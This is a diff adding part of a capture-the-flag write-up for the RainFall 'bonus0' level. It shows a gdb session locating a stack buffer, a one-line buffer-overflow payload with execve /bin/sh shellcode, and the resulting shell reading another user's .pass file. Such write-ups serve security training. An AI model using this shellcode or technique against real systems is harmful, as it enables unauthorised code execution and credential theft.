@@ -139,4 +139,31 @@ payload :
 # first arg : [NOP * 500] + [shellcode]
 # scond arg : [offset (9)] + [Address in our nop instructions (+61 to +500)] + [filler to get to 20 bytes]
 
+We need to find the start address of our 4096 buffer so we can point to one of our nop instruction ! 
+
+(gdb) b *0x080484d0  --> We put a breakpoint on the LEA instruction witch allocate our buffer and we print the start address
+Breakpoint 1 at 0x80484d0
+(gdb) r
+Starting program: /home/user/bonus0/bonus0 
+ - 
+
+Breakpoint 1, 0x080484d0 in p ()
+(gdb) x $ebp-0x1008
+0xbfffe580:	0x00000000   --> our start address is 0xbfffe580
+
+So we pick a random place in our NOP instruction  (+61 to + 500) we took +250 -> 0xbfffe67a
+
+Final payloa : (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x7a\xe6\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
+
+
+bonus0@RainFall:~$ (python -c 'print "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'; python -c 'print "\x90" * 9 + "\x7a\xe6\xff\xbf" + "\x90" * 7'; cat) | ./bonus0
+ - 
+ - 
+�����������������������������z������������� ���������z�������������
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+YEAY IT WORK 
 
